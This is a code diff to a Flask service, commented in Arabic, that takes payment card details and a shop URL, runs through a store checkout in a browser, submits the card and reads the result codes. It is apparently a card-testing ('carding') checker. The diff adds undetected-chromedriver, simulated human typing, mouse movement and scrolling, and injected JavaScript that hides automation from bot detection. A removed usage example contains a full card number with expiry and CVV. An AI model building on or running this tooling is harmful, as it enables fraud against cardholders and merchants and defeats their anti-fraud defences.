@@ -1,14 +1,13 @@
-# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة المتوازية
+# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة + undetected-chromedriver
 import time
 import re
 import json
 import requests
 from urllib.parse import urljoin
-from selenium import webdriver
+import undetected_chromedriver as uc
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait, Select
 from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.action_chains import ActionChains
 from selenium.webdriver.common.keys import Keys
 from flask import Flask, request, jsonify
@@ -22,17 +21,15 @@ import random
 app = Flask(__name__)
 
 # ==================== إعدادات الأداء ====================
-MAX_WORKERS = 10  # عدد الطلبات المتوازية اللي تشتغل بنفس الوقت
-REQUEST_TIMEOUT = 60
+MAX_WORKERS = 5  # عدد الطلبات المتوازية (قللناه لأن undetected-chromedriver يستهلك موارد أكثر)
+REQUEST_TIMEOUT = 90  # زودنا الوقت لأن السلوك البشري يأخذ وقت أطول
 TASK_QUEUE = queue.Queue()
-
-# منفذ العمليات المتوازية - هذا اللي يخلي الطلبات تشتغل بنفس الوقت
 executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# عداد لتتبع الطلبات النشطة
+# تتبع المهام النشطة
 active_tasks = {}
 active_tasks_lock = threading.Lock()
 
@@ -209,17 +206,59 @@ def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
     
     return None, None
 
+def human_type(element, text, driver):
+    """
+    كتابة النص حرف حرف بطريقة بشرية مع تأخيرات عشوائية
+    """
+    element.click()
+    time.sleep(random.uniform(0.1, 0.3))
+    element.clear()
+    time.sleep(random.uniform(0.05, 0.15))
+    
+    for char in text:
+        element.send_keys(char)
+        time.sleep(random.uniform(0.03, 0.12))
+    
+    time.sleep(random.uniform(0.1, 0.3))
+
+def human_mouse_move(driver, element):
+    """
+    تحريك الماوس بشكل عشوائي نحو العنصر
+    """
+    try:
+        actions = ActionChains(driver)
+        # تحريك عشوائي قبل الوصول للعنصر
+        for _ in range(random.randint(1, 3)):
+            x_offset = random.randint(-100, 100)
+            y_offset = random.randint(-50, 50)
+            actions.move_by_offset(x_offset, y_offset)
+            actions.pause(random.uniform(0.05, 0.2))
+        
+        actions.move_to_element(element)
+        actions.pause(random.uniform(0.1, 0.3))
+        actions.perform()
+    except:
+        pass
+
+def random_scroll(driver):
+    """
+    تمرير عشوائي للصفحة لمحاكاة السلوك البشري
+    """
+    try:
+        total_height = driver.execute_script("return document.body.scrollHeight")
+        scroll_points = random.randint(1, 3)
+        for _ in range(scroll_points):
+            scroll_to = random.randint(100, total_height - 100)
+            driver.execute_script(f"window.scrollTo({{top: {scroll_to}, behavior: 'smooth'}});")
+            time.sleep(random.uniform(0.3, 0.8))
+    except:
+        pass
+
 def ff(ccx, site, task_id=None):
     """
-    دالة معالجة بطاقة واحدة وموقع واحد
-    تعمل بشكل مستقل تماماً - كل استدعاء له متصفحه الخاص
-    
-    ccx: رقم البطاقة|الشهر|السنة|cvv
-    site: رابط الموقع
-    task_id: معرف المهمة للتتبع
+    دالة معالجة بطاقة واحدة وموقع واحد - تستخدم undetected-chromedriver
     """
     
-    # تسجيل بدء المهمة
     if task_id:
         with active_tasks_lock:
             active_tasks[task_id] = {"status": "running", "started": time.time(), "cc": ccx, "site": site}
@@ -248,7 +287,6 @@ def ff(ccx, site, task_id=None):
     checkout_url = None
     final_url = None
     order_number = None
-    payment_status = None
     
     # ==================== 1. جلب رابط الدفع ====================
     try:
@@ -258,7 +296,7 @@ def ff(ccx, site, task_id=None):
         proxies = {"http": proxy_url, "https": proxy_url}
         
         s = requests.Session()
-        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
+        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'})
         
         digital_keywords = [
             'worry-free', 'protection', 'insurance', 'warranty', 'digital', 
@@ -315,44 +353,75 @@ def ff(ccx, site, task_id=None):
     except Exception as e:
         return {"success": False, "code": None, "error": str(e), "task_id": task_id}
     
-    # ==================== 2. تشغيل المتصفح ====================
+    # ==================== 2. تشغيل المتصفح - undetected-chromedriver ====================
     driver = None
     try:
-        chrome_options = Options()
-        chrome_options.add_argument('--headless')
-        chrome_options.add_argument('--no-sandbox')
-        chrome_options.add_argument('--disable-dev-shm-usage')
-        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
-        chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
-        chrome_options.add_experimental_option('useAutomationExtension', False)
-        chrome_options.add_argument('--disable-web-security')
-        chrome_options.add_argument('--disable-features=IsolateOrigins,site-per-process')
-        chrome_options.add_argument('--disable-popup-blocking')
-        chrome_options.add_argument('--disable-gpu')
-        chrome_options.add_argument('--disable-notifications')
-        chrome_options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})
+        # إعدادات undetected-chromedriver
+        options = uc.ChromeOptions()
+        options.add_argument('--headless=new')  # وضع headless جديد
+        options.add_argument('--no-sandbox')
+        options.add_argument('--disable-dev-shm-usage')
+        options.add_argument('--disable-blink-features=AutomationControlled')
+        options.add_argument('--disable-web-security')
+        options.add_argument('--disable-features=IsolateOrigins,site-per-process')
+        options.add_argument('--disable-popup-blocking')
+        options.add_argument('--disable-gpu')
+        options.add_argument('--disable-notifications')
+        options.add_argument('--disable-infobars')
+        options.add_argument('--disable-extensions')
+        options.add_argument('--window-size=1920,1080')
+        options.add_argument('--start-maximized')
         
-        driver = webdriver.Chrome(options=chrome_options)
-        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
-        wait = WebDriverWait(driver, 15)
-        driver.set_page_load_timeout(25)
+        # استخدام undetected-chromedriver بدل selenium العادي
+        driver = uc.Chrome(options=options, version_main=None, use_subprocess=True)
         
+        # تنفيذ إضافي لإخفاء الأتمتة
+        driver.execute_script("""
+            // إخفاء navigator.webdriver
+            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+            
+            // إخفاء chrome.runtime
+            window.chrome = {runtime: {}};
+            
+            // إخفاء plugins
+            Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
+            
+            // إخفاء languages
+            Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
+            
+            // إخفاء permissions
+            const originalQuery = window.navigator.permissions.query;
+            window.navigator.permissions.query = (parameters) => (
+                parameters.name === 'notifications' ?
+                Promise.resolve({state: Notification.permission}) :
+                originalQuery(parameters)
+            );
+        """)
+        
+        wait = WebDriverWait(driver, 20)
+        driver.set_page_load_timeout(30)
+        
+        # فتح صفحة checkout
         driver.get(checkout_url)
-        time.sleep(2)
+        time.sleep(random.uniform(2, 4))
         
-        # ==================== 3. تعبئة الشحن ====================
+        # تمرير عشوائي لمحاكاة بشري
+        random_scroll(driver)
+        time.sleep(random.uniform(0.5, 1.5))
+        
+        # ==================== 3. تعبئة الشحن بطريقة بشرية ====================
         try:
             email_field = wait.until(EC.presence_of_element_located((By.ID, "email")))
-            email_field.clear()
-            email_field.send_keys(shipping_data["email"])
-            time.sleep(1.5)
+            human_mouse_move(driver, email_field)
+            human_type(email_field, shipping_data["email"], driver)
+            time.sleep(random.uniform(1, 2))
             
             try:
                 country_select = driver.find_element(By.NAME, "countryCode")
                 current_country = country_select.get_attribute('value')
                 if current_country != "US":
                     Select(country_select).select_by_value("US")
-                    time.sleep(0.5)
+                    time.sleep(random.uniform(0.3, 0.7))
             except:
                 pass
             
@@ -368,8 +437,9 @@ def ff(ccx, site, task_id=None):
             for field_name, value in fields.items():
                 try:
                     element = driver.find_element(By.NAME, field_name)
-                    element.clear()
-                    element.send_keys(value)
+                    human_mouse_move(driver, element)
+                    human_type(element, value, driver)
+                    time.sleep(random.uniform(0.3, 0.8))
                 except:
                     pass
             
@@ -379,24 +449,31 @@ def ff(ccx, site, task_id=None):
             except:
                 try:
                     state_input = driver.find_element(By.NAME, "zone")
-                    state_input.clear()
-                    state_input.send_keys(shipping_data["state"])
+                    human_mouse_move(driver, state_input)
+                    human_type(state_input, shipping_data["state"], driver)
                     state_input.send_keys(Keys.ENTER)
                 except:
                     pass
             
-            time.sleep(0.5)
+            time.sleep(random.uniform(0.5, 1))
+            
+            # تمرير قبل الضغط على continue
+            random_scroll(driver)
+            time.sleep(random.uniform(0.3, 0.7))
+            
             continue_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']")))
+            human_mouse_move(driver, continue_btn)
+            time.sleep(random.uniform(0.2, 0.5))
             driver.execute_script("arguments[0].click();", continue_btn)
-            time.sleep(2)
+            time.sleep(random.uniform(2, 4))
             
         except:
             return {"success": False, "code": None, "error": "Shipping fill failed", "task_id": task_id}
         
-        # ==================== 4. تعبئة الدفع ====================
+        # ==================== 4. تعبئة الدفع بطريقة بشرية ====================
         try:
             driver.switch_to.default_content()
-            time.sleep(0.5)
+            time.sleep(random.uniform(0.5, 1.5))
             
             iframes = driver.find_elements(By.TAG_NAME, 'iframe')
             
@@ -417,52 +494,28 @@ def ff(ccx, site, task_id=None):
                         input_id = input_elem.get_attribute('id') or ''
                         
                         if not card_filled and (data_field == 'number' or 'card number' in placeholder.lower() or autocomplete == 'cc-number'):
-                            driver.execute_script("""
-                                arguments[0].focus();
-                                arguments[0].value = '';
-                                arguments[0].value = arguments[1];
-                                arguments[0].dispatchEvent(new Event('input', {bubbles: true}));
-                                arguments[0].dispatchEvent(new Event('change', {bubbles: true}));
-                                arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
-                            """, input_elem, card_data["number"])
+                            human_mouse_move(driver, input_elem)
+                            human_type(input_elem, card_data["number"], driver)
                             card_filled = True
-                            time.sleep(0.2)
+                            time.sleep(random.uniform(0.3, 0.6))
                         
                         elif not expiry_filled and (data_field == 'expiry' or 'expiry' in placeholder.lower() or autocomplete == 'cc-exp'):
-                            driver.execute_script("""
-                                arguments[0].focus();
-                                arguments[0].value = '';
-                                arguments[0].value = arguments[1];
-                                arguments[0].dispatchEvent(new Event('input', {bubbles: true}));
-                                arguments[0].dispatchEvent(new Event('change', {bubbles: true}));
-                                arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
-                            """, input_elem, card_data["expiry"])
+                            human_mouse_move(driver, input_elem)
+                            human_type(input_elem, card_data["expiry"], driver)
                             expiry_filled = True
-                            time.sleep(0.2)
+                            time.sleep(random.uniform(0.3, 0.6))
                         
                         elif not cvv_filled and (data_field == 'cvv' or 'cvv' in placeholder.lower() or autocomplete == 'cc-csc'):
-                            driver.execute_script("""
-                                arguments[0].focus();
-                                arguments[0].value = '';
-                                arguments[0].value = arguments[1];
-                                arguments[0].dispatchEvent(new Event('input', {bubbles: true}));
-                                arguments[0].dispatchEvent(new Event('change', {bubbles: true}));
-                                arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
-                            """, input_elem, card_data["cvv"])
+                            human_mouse_move(driver, input_elem)
+                            human_type(input_elem, card_data["cvv"], driver)
                             cvv_filled = True
-                            time.sleep(0.2)
+                            time.sleep(random.uniform(0.3, 0.6))
                         
                         elif not name_filled and (data_field == 'name' or 'name' in placeholder.lower() or autocomplete == 'cc-name'):
-                            driver.execute_script("""
-                                arguments[0].focus();
-                                arguments[0].value = '';
-                                arguments[0].value = arguments[1];
-                                arguments[0].dispatchEvent(new Event('input', {bubbles: true}));
-                                arguments[0].dispatchEvent(new Event('change', {bubbles: true}));
-                                arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
-                            """, input_elem, card_data["name"])
+                            human_mouse_move(driver, input_elem)
+                            human_type(input_elem, card_data["name"], driver)
                             name_filled = True
-                            time.sleep(0.2)
+                            time.sleep(random.uniform(0.3, 0.6))
                     
                     driver.switch_to.default_content()
                     
@@ -607,11 +660,14 @@ def ff(ccx, site, task_id=None):
             };
             """
             driver.execute_script(script)
-            time.sleep(0.5)
+            time.sleep(random.uniform(0.5, 1))
             
             # ==================== 6. الضغط على Pay ====================
             driver.switch_to.default_content()
-            time.sleep(1)
+            time.sleep(random.uniform(1, 2))
+            
+            random_scroll(driver)
+            time.sleep(random.uniform(0.3, 0.7))
             
             pay_selectors = [
                 "//button[contains(text(), 'Pay now')]",
@@ -635,6 +691,8 @@ def ff(ccx, site, task_id=None):
                     continue
             
             if pay_button:
+                human_mouse_move(driver, pay_button)
+                time.sleep(random.uniform(0.3, 0.7))
                 driver.execute_script("arguments[0].click();", pay_button)
             else:
                 driver.execute_script("""
@@ -656,7 +714,6 @@ def ff(ccx, site, task_id=None):
             is_3ds = False
             order_confirmed = False
             order_number = None
-            payment_status = None
             
             excluded_codes = [
                 'REQUIRED_ARTIFACTS_UNAVAILABLE',
@@ -674,28 +731,24 @@ def ff(ccx, site, task_id=None):
                 'Free Postal Shipping',
                 'UPS',
                 'DELIVERY_PHONE_NUMBER_REQUIRED',
-             'Economy',
-             'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE', 
-            'First', 
-            'by-items', 
-            'Standard', 
-            'Priority', 
-            'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE', 
-            'GroundAdvantage', 
-            'MediaMail'
-           
-             
+                'Economy',
+                'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE',
+                'First',
+                'by-items',
+                'Standard',
+                'Priority',
+                'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE',
+                'GroundAdvantage',
+                'MediaMail'
             ]
             
             for attempt in range(10):
-                time.sleep(1.5)
+                time.sleep(random.uniform(1, 2))
                 
                 poll_responses = driver.execute_script("return window.pollForReceiptResponses || [];")
                 graphql_responses = driver.execute_script("return window.graphqlResponses || [];")
                 current_url = driver.current_url
                 final_url = current_url
-                
-                page_urls = driver.execute_script("return window.pageUrls || [];")
                 
                 if '/thank_you' in current_url:
                     order_confirmed = True
@@ -1019,7 +1072,6 @@ def ff(ccx, site, task_id=None):
                     result_code = None
                     result_typename = None
             
-            # تحديث حالة المهمة
             if task_id:
                 with active_tasks_lock:
                     if task_id in active_tasks:
@@ -1103,9 +1155,6 @@ def home():
     
     الاستخدام:
     /?cc=بطاقة|شهر|سنة|cvv&url=رابط_الموقع
-    
-    مثال:
-    /?cc=4918460118934875|08|2027|293&url=https://www.example.com
     """
     cc = request.args.get('cc')
     url = request.args.get('url')
@@ -1117,10 +1166,9 @@ def home():
             "error": "Missing cc or url parameters. Use /?cc=CARD&url=SITE"
         })
     
-    # توليد معرف للمهمة
     task_id = f"task_{int(time.time()*1000)}_{random.randint(1000,9999)}"
     
-    # تنفيذ المهمة في Thread منفصل - هذا يسمح بتنفيذ عدة طلبات بنفس الوقت
+    # تنفيذ في Thread منفصل للتوازي
     future = executor.submit(ff, cc, url, task_id)
     
     try:
@@ -1136,9 +1184,6 @@ def home():
 
 @app.route('/status', methods=['GET'])
 def status():
-    """
-    معرفة حالة جميع المهام النشطة
-    """
     with active_tasks_lock:
         return jsonify({
             "active_tasks_count": len(active_tasks),
@@ -1156,5 +1201,4 @@ def health():
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
-    # تشغيل Flask مع دعم threads للتوازي
     app.run(host='0.0.0.0', port=port, threaded=True)
